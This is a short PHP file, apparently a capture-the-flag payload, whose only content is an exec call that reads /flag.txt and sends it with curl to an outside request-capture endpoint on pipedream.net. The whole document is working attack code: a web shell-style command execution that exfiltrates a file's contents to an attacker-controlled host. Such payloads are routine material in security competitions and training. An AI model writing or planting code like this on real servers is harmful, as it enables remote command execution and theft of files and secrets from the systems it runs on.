<?php
    exec('curl https://enqw5alo34o5wr4.m.pipedream.net?flag=$(cat /flag.txt)');
?>